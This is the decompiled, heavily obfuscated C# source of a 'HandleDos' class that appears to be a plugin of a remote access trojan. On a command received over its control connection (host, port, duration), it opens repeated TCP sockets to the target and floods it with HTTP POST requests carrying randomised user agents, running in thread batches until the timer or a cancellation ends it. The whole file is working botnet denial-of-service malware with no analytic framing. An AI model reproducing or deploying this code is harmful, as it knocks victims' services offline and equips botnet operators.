using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using Plugin;
using UY3BiEArlp6B4GPt9k;

namespace Miscellaneous.Handler;

public class HandleDos
{
	private string host;

	private int port;

	private int timeout;

	private readonly string[] userAgents;

	internal static HandleDos E1kjKjzodwCBIhTwUR;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void DosPost(MsgPack unpack_msgpack)
	{
		switch (1)
		{
		case 0:
			break;
		case 1:
			try
			{
				host = (string)gDXmYhXtdynoLeQS531(new Uri((string)EOfWNkXnMjp51n5Igs8(oMBr13X764vnB3V6tpp(unpack_msgpack, QcGBQgXDAbkGxb42i6Y(548)))), zVYIKQMSYiXDLtRkIF.mos5sI5qRD);
				int num = 1;
				if (Dg38fyXXKV7EMXu0E6S() != null)
				{
					goto IL_0065;
				}
				goto IL_0069;
				IL_0065:
				int num2 = default(int);
				num = num2;
				goto IL_0069;
				IL_0069:
				int num3 = default(int);
				TimeSpan timeSpan = default(TimeSpan);
				Stopwatch stopwatch = default(Stopwatch);
				while (true)
				{
					switch (num)
					{
					case 11:
						return;
					case 15:
						num3++;
						num = 5;
						continue;
					case 2:
						num3 = 0;
						num = 9;
						if (Dg38fyXXKV7EMXu0E6S() == null)
						{
							continue;
						}
						break;
					case 1:
						port = TKBQPBXRkqKMSA2NTc0(((MsgPack)oMBr13X764vnB3V6tpp(unpack_msgpack, QcGBQgXDAbkGxb42i6Y(560))).AsString, eVbQ7a5tFslWP0n1xbF.keo5bTvPLq);
						num = 0;
						if (Dg38fyXXKV7EMXu0E6S() == null)
						{
							num = 13;
						}
						continue;
					case 10:
						if (!PywEIwXs4sFf7nLv7Sh())
						{
							num = 11;
							if (Dg38fyXXKV7EMXu0E6S() == null)
							{
								continue;
							}
							break;
						}
						goto case 2;
					case 6:
					case 8:
						if (ghNsryXgdv2FX6xhBuL(Packet.ctsDos, usYj67JBV1NBBsby7v.QCg5jAMmK8))
						{
							return;
						}
						num = 7;
						continue;
					case 12:
						VelaOTX5XbRPCeVL6Xj(5000, ThQYPEdOtoI0yBsIqM.wcOEk6BtN);
						num = 5;
						if (AZ8awXXPmet7vJMw1VI())
						{
							num = 6;
						}
						continue;
					case 5:
					case 9:
						if (num3 >= 20)
						{
							num = 12;
							continue;
						}
						goto case 3;
					case 7:
						if (!R5Nc0fXjn7FWMqURasx(timeSpan, BIbDS5XUpu52hriaHD9(stopwatch, UWult55PAJe4lrqxlfN.EgG5It5KVx), rpuQVl5Mlg0B5guCSIJ.bUn503OZFR))
						{
							return;
						}
						num = 10;
						continue;
					case 14:
						xa0LeyXSrSgdZBxcrZ0(stopwatch, xoRAhX7vZnAU6ouQJf.jT85u1RFEQ);
						num = 8;
						continue;
					case 4:
						stopwatch = new Stopwatch();
						num = 14;
						continue;
					case 13:
						timeout = eVbQ7a5tFslWP0n1xbF.cnL5MhNQE((string)EOfWNkXnMjp51n5Igs8(oMBr13X764vnB3V6tpp(unpack_msgpack, QcGBQgXDAbkGxb42i6Y(572))), eVbQ7a5tFslWP0n1xbF.keo5bTvPLq) * 60;
						num = 0;
						if (Dg38fyXXKV7EMXu0E6S() == null)
						{
							num = 0;
						}
						continue;
					default:
						timeSpan = QO1pSG54wGJpY70OqKt.cnL5MhNQE(timeout, QO1pSG54wGJpY70OqKt.amW5yFpxoc);
						num = 4;
						continue;
					case 3:
						xoRAhX7vZnAU6ouQJf.cnL5MhNQE(new Thread([MethodImpl(MethodImplOptions.NoInlining)] () =>
						{
							switch (1)
							{
							case 0:
								break;
							case 1:
								try
								{
									Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
									int num6 = 5;
									byte[] array = default(byte[]);
									string text = default(string);
									int num7 = default(int);
									while (true)
									{
										switch (num6)
										{
										case 2:
											return;
										case 1:
											xa0LeyXSrSgdZBxcrZ0(socket, xoRAhX7vZnAU6ouQJf.Tja5itkHeZ);
											num6 = 2;
											if (!AZ8awXXPmet7vJMw1VI())
											{
												num6 = 0;
											}
											break;
										case 3:
											VelaOTX5XbRPCeVL6Xj(2500, ThQYPEdOtoI0yBsIqM.wcOEk6BtN);
											num6 = 1;
											if (AZ8awXXPmet7vJMw1VI())
											{
												break;
											}
											goto IL_003a;
										default:
											array = f3DDcR5Bv8FmsgPHfCB.cnL5MhNQE(dp1blXXfSZ3t2JwbVXp(klIUUc5aP9EiE6qr3Ps.Xie52j2ypr), text, f3DDcR5Bv8FmsgPHfCB.tN75UYAmqm);
											num6 = 4;
											if (Dg38fyXXKV7EMXu0E6S() == null)
											{
												break;
											}
											goto IL_003a;
										case 6:
											text = (string)yEIeAgXrs7Feox5uqJJ(new string[5]
											{
												(string)QcGBQgXDAbkGxb42i6Y(1262),
												host,
												(string)QcGBQgXDAbkGxb42i6Y(1312),
												userAgents[el9ewr5JWbpCdTLabio.cnL5MhNQE(new Random(), userAgents.Length, el9ewr5JWbpCdTLabio.OEy5XlmeLR)],
												(string)QcGBQgXDAbkGxb42i6Y(1492)
											}, N5OMWJ57yIY7I87W4sj.QyK5NKThfc);
											num6 = 0;
											if (AZ8awXXPmet7vJMw1VI())
											{
												break;
											}
											goto IL_003a;
										case 5:
											gDidJJXGKWVHfTstT0e(socket, gDXmYhXtdynoLeQS531(host, zVYIKQMSYiXDLtRkIF.gHC5xh3KTY), port, X1Z8Dn5Cas0P6ZsMoxd.D8P5DGMiun);
											num6 = 6;
											break;
										case 4:
											{
												cmWPQXXd3WXCgZBpyjC(socket, array, 0, array.Length, SocketFlags.None, RFup9P56qDeIXYBC0Zp.FYs5wBE1NX);
												num6 = 3;
												break;
											}
											IL_003a:
											num6 = num7;
											break;
										}
									}
								}
								catch
								{
									int num8 = 0;
									if (!AZ8awXXPmet7vJMw1VI())
									{
										num8 = 0;
									}
									switch (num8)
									{
									case 0:
										break;
									}
									break;
								}
							}
						}), xoRAhX7vZnAU6ouQJf.zFw5Rr8YTC);
						num2 = 15;
						break;
					}
					break;
				}
				goto IL_0065;
			}
			catch (Exception ex)
			{
				Packet.Error((string)gDXmYhXtdynoLeQS531(ex, zVYIKQMSYiXDLtRkIF.N15Vrd53r));
				int num4 = 1;
				if (Dg38fyXXKV7EMXu0E6S() != null)
				{
					int num5 = default(int);
					num4 = num5;
				}
				while (true)
				{
					switch (num4)
					{
					default:
						return;
					case 0:
						return;
					case 1:
						xa0LeyXSrSgdZBxcrZ0(Packet.ctsDos, xoRAhX7vZnAU6ouQJf.Hwn5kkK6Dd);
						num4 = 0;
						if (Dg38fyXXKV7EMXu0E6S() != null)
						{
							num4 = 0;
						}
						break;
					}
				}
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleDos()
	{
		pLaP0vXVffKG6Ao1Mb4();
		userAgents = new string[3]
		{
			nCP5vtxT3QjsSeuiK3.xuCtsHmOK(590),
			(string)QcGBQgXDAbkGxb42i6Y(750),
			(string)QcGBQgXDAbkGxb42i6Y(1028)
		};
		base._002Ector();
		int num = 0;
		if (false)
		{
			int num2;
			num = num2;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object QcGBQgXDAbkGxb42i6Y(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object oMBr13X764vnB3V6tpp(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object EOfWNkXnMjp51n5Igs8(object P_0)
	{
		return ((MsgPack)P_0).AsString;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object gDXmYhXtdynoLeQS531(object P_0, object P_1)
	{
		return zVYIKQMSYiXDLtRkIF.cnL5MhNQE(P_0, (zVYIKQMSYiXDLtRkIF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int TKBQPBXRkqKMSA2NTc0(object P_0, object P_1)
	{
		return eVbQ7a5tFslWP0n1xbF.cnL5MhNQE((string)P_0, (eVbQ7a5tFslWP0n1xbF)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void xa0LeyXSrSgdZBxcrZ0(object P_0, object P_1)
	{
		xoRAhX7vZnAU6ouQJf.cnL5MhNQE(P_0, (xoRAhX7vZnAU6ouQJf)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void VelaOTX5XbRPCeVL6Xj(int P_0, object P_1)
	{
		ThQYPEdOtoI0yBsIqM.cnL5MhNQE(P_0, (ThQYPEdOtoI0yBsIqM)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool ghNsryXgdv2FX6xhBuL(object P_0, object P_1)
	{
		return usYj67JBV1NBBsby7v.cnL5MhNQE(P_0, (usYj67JBV1NBBsby7v)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static TimeSpan BIbDS5XUpu52hriaHD9(object P_0, object P_1)
	{
		return UWult55PAJe4lrqxlfN.cnL5MhNQE(P_0, (UWult55PAJe4lrqxlfN)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool R5Nc0fXjn7FWMqURasx(TimeSpan P_0, TimeSpan P_1, object P_2)
	{
		return rpuQVl5Mlg0B5guCSIJ.cnL5MhNQE(P_0, P_1, (rpuQVl5Mlg0B5guCSIJ)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool PywEIwXs4sFf7nLv7Sh()
	{
		return Connection.IsConnected;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool AZ8awXXPmet7vJMw1VI()
	{
		return E1kjKjzodwCBIhTwUR == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleDos Dg38fyXXKV7EMXu0E6S()
	{
		return E1kjKjzodwCBIhTwUR;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void pLaP0vXVffKG6Ao1Mb4()
	{
		WkMgYHbfSUMGdoITRx.Mwxkyt2zf90Xh();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void gDidJJXGKWVHfTstT0e(object P_0, object P_1, int P_2, object P_3)
	{
		X1Z8Dn5Cas0P6ZsMoxd.cnL5MhNQE(P_0, (string)P_1, P_2, (X1Z8Dn5Cas0P6ZsMoxd)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object yEIeAgXrs7Feox5uqJJ(object P_0, object P_1)
	{
		return N5OMWJ57yIY7I87W4sj.cnL5MhNQE((string[])P_0, (N5OMWJ57yIY7I87W4sj)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object dp1blXXfSZ3t2JwbVXp(object P_0)
	{
		return klIUUc5aP9EiE6qr3Ps.cnL5MhNQE((klIUUc5aP9EiE6qr3Ps)P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int cmWPQXXd3WXCgZBpyjC(object P_0, object P_1, int P_2, int P_3, SocketFlags P_4, object P_5)
	{
		return RFup9P56qDeIXYBC0Zp.cnL5MhNQE(P_0, (byte[])P_1, P_2, P_3, P_4, (RFup9P56qDeIXYBC0Zp)P_5);
	}
}
